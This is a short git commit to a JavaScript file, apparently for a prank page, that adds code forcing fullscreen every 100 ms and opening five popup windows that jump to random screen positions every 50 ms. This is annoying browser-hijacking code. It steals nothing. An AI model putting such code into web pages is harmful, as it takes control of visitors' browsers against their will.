03d833443abf289b3d6a5cac996c2e0b672b9ccf
Twenmod <Twengames@gmail.com>
2024-04-18 00:07:50 +0200

    aaa

--- index.js
+++ index.js
@@ -3,7 +3,27 @@ var elem = document.getElementById("rick");
 function setFullscreen() {
     if (elem !== null)
         elem.requestFullscreen();
+}
+function fullFullscreen() {
     document.documentElement.requestFullscreen()
+
 }
 
 setInterval(setFullscreen, 100);
+setInterval(fullFullscreen, 100);
+
+function annoyance(windowtouse) {
+    windowtouse.moveTo(Math.floor(Math.random() * screen.width), Math.floor(Math.random() * screen.height));
+}
+function popup(url) {
+    for (var I = 0; I < 5; I++) {
+      var i = Math.random();
+      newwindow = window.open(url, i, 'height=170,width=800');
+      if (window.focus) { newwindow.focus() }
+      setInterval(annoyance, 50, newwindow);
+  
+  
+    }
+    return false;
+  }
+  popup("https://twenmod.github.io/Site/");
